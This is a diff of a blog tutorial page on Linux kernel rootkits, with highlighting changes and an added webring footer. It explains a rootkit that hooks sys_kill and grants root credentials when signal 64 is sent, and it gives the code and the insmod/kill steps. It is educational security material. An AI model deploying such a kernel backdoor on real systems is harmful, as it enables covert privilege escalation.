@@ -186,18 +186,18 @@ In this first example, we&amp;rsquo;re going to make a rootkit that intercepts c
 <p>This is what our <code>hook_kill</code> function looks like. Note that for most of these posts, I&rsquo;m going to stick to the <code>pt_regs</code> convention (it&rsquo;s very to easy to re-write them for the old way). As always, the full working source is available at the <a href="https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.3_set_root">repo</a>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>asmlinkage <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hook_kill</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> pt_regs <span style="color:#f92672">*</span>regs)
 </span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> set_root(<span style="color:#66d9ef">void</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">set_root</span>(<span style="color:#66d9ef">void</span>);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> sig <span style="color:#f92672">=</span> regs<span style="color:#f92672">-&gt;</span>si;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (sig <span style="color:#f92672">==</span> <span style="color:#ae81ff">64</span>)
 </span></span><span style="display:flex;"><span>    {
-</span></span><span style="display:flex;"><span>        printk(KERN_INFO <span style="color:#e6db74">&#34;rootkit: giving root...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>        set_root();
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printk</span>(KERN_INFO <span style="color:#e6db74">&#34;rootkit: giving root...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">set_root</span>();
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> orig_kill(regs);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">orig_kill</span>(regs);
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>Notice that we have to pull out the <code>sig</code> argument from the <code>si</code> field of <code>regs</code>. As in <a href="../linux_rootkits_02">Part 2</a>, we get this information from the <a href="https://syscalls64.paolostivanin.com/">Linux Syscall Reference</a>, which tells us that <code>sys_kill</code> does indeed expect <code>sig</code> to be placed into the <code>si</code> register when it&rsquo;s called. Another thing to note is that if the signal is <code>64</code>, then nothing is actually sent to any process! In other words, if we want the <code>set_root()</code> function to get called, we&rsquo;ll need to send signal <code>64</code> to <em>something</em>, but that <em>something</em> will never actually receive anything, so it really doesn&rsquo;t matter which PID we choose.</p>
 <p>That&rsquo;s all there is to the syscall hook! Easy, right? The brains of this rootkit actually comes from the <code>set_root()</code> function, which is what we now come to.</p>
@@ -208,28 +208,28 @@ In this first example, we&amp;rsquo;re going to make a rootkit that intercepts c
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">set_root</span>(<span style="color:#66d9ef">void</span>)
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> cred <span style="color:#f92672">*</span>root;
-</span></span><span style="display:flex;"><span>    root <span style="color:#f92672">=</span> prepare_creds();
+</span></span><span style="display:flex;"><span>    root <span style="color:#f92672">=</span> <span style="color:#a6e22e">prepare_creds</span>();
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (root <span style="color:#f92672">==</span> NULL)
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Set the credentials to root */</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    commit_creds(root);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">commit_creds</span>(root);
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>Now we have just have to fill in that middle bit! How do we go about finding the layout of the <code>cred</code> struct in the source? Although I always link to the kernel source on GitHub, the search in GitHub is awful. For this reason, it&rsquo;s best to keep a copy of the kernel source from <a href="https://github.com/torvalds/linux">torvalds</a> on your Vagrant machine - this way, you can just grep for what you&rsquo;re after. In this instance, <code>grep -ir struct\ cred\ {</code> only gives one result: <a href="https://github.com/torvalds/linux/blob/master/include/linux/cred.h">include/linux/cred.h</a>.</p>
 <p>Down on <a href="https://github.com/torvalds/linux/blob/1127b219ce9481c84edad9711626d856127d5e51/include/linux/cred.h#L111">line 111</a>, we see the following (shortened for clarity):</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> cred {
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* redacted */</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    kuid_t      uid;    <span style="color:#75715e">/* real UID of the task */</span>
-</span></span><span style="display:flex;"><span>    kgid_t      gid;    <span style="color:#75715e">/* real GID of the task */</span>
-</span></span><span style="display:flex;"><span>    kuid_t      suid;   <span style="color:#75715e">/* saved UID of the task */</span>
-</span></span><span style="display:flex;"><span>    kgid_t      sgid;   <span style="color:#75715e">/* saved GID of the task */</span>
-</span></span><span style="display:flex;"><span>    kuid_t      euid;   <span style="color:#75715e">/* effective UID of the task */</span>
-</span></span><span style="display:flex;"><span>    kgid_t      egid;   <span style="color:#75715e">/* effective GID of the task */</span>
-</span></span><span style="display:flex;"><span>    kuid_t      fsuid;  <span style="color:#75715e">/* UID for VFS ops */</span>
-</span></span><span style="display:flex;"><span>    kgid_t      fdgid;  <span style="color:#75715e">/* GID for VFS ops */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">kuid_t</span>      uid;    <span style="color:#75715e">/* real UID of the task */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">kgid_t</span>      gid;    <span style="color:#75715e">/* real GID of the task */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">kuid_t</span>      suid;   <span style="color:#75715e">/* saved UID of the task */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">kgid_t</span>      sgid;   <span style="color:#75715e">/* saved GID of the task */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">kuid_t</span>      euid;   <span style="color:#75715e">/* effective UID of the task */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">kgid_t</span>      egid;   <span style="color:#75715e">/* effective GID of the task */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">kuid_t</span>      fsuid;  <span style="color:#75715e">/* UID for VFS ops */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">kgid_t</span>      fdgid;  <span style="color:#75715e">/* GID for VFS ops */</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* redacted */</span>
 </span></span><span style="display:flex;"><span>}
@@ -243,7 +243,7 @@ In this first example, we&amp;rsquo;re going to make a rootkit that intercepts c
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">set_root</span>(<span style="color:#66d9ef">void</span>)
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> cred <span style="color:#f92672">*</span>root;
-</span></span><span style="display:flex;"><span>    root <span style="color:#f92672">=</span> prepare_creds();
+</span></span><span style="display:flex;"><span>    root <span style="color:#f92672">=</span> <span style="color:#a6e22e">prepare_creds</span>();
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (root <span style="color:#f92672">==</span> NULL)
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
@@ -253,7 +253,7 @@ In this first example, we&amp;rsquo;re going to make a rootkit that intercepts c
 </span></span><span style="display:flex;"><span>    root<span style="color:#f92672">-&gt;</span>suid.val <span style="color:#f92672">=</span> root<span style="color:#f92672">-&gt;</span>sgid.val <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
 </span></span><span style="display:flex;"><span>    root<span style="color:#f92672">-&gt;</span>fsuid.val <span style="color:#f92672">=</span> root<span style="color:#f92672">-&gt;</span>fsgid.val <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    commit_creds(root);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">commit_creds</span>(root);
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>Okay, if you&rsquo;ve been following along, then finish up your hook and the rest of the ftrace business (see <a href="../linux_rootkits_02/">Part 2</a>) - otherwise you can download the completed rookit source <a href="https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.3_set_root">here</a>.</p>
 <p>Go ahead and <code>make</code> your kernel module and <code>insmod</code> it. Now simply send signal <code>64</code> to <em>any</em> process, say <code>kill -64 1</code>. Now check <code>id</code> and you&rsquo;ll be root!</p>
@@ -316,6 +316,21 @@ uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),111(
 
 <script src="/assets/main.js"></script>
 <script src="/assets/prism.js"></script>
+
+<div class="footer__webring">
+    <span>
+        <div>
+            this site is part of the <a href='https://pixeldreams.tokyo/cgi-bin/webring.cgi'>HauNTed wEbriNg</a>
+        </div>
+        <div>
+            <p>
+                <a href='https://pixeldreams.tokyo/cgi-bin/webring.cgi?before=https://xcellerator.github.io/'>&lt;&lt;&lt;</a>
+                <a href='https://pixeldreams.tokyo/cgi-bin/webring.cgi?random=https://xcellerator.github.io/'>RaNDom</a>
+                <a href='https://pixeldreams.tokyo/cgi-bin/webring.cgi?after=https://xcellerator.github.io/'>&gt;&gt;&gt;</a>
+            </p>
+        </div>
+    </span>
+</div>
 
 
 
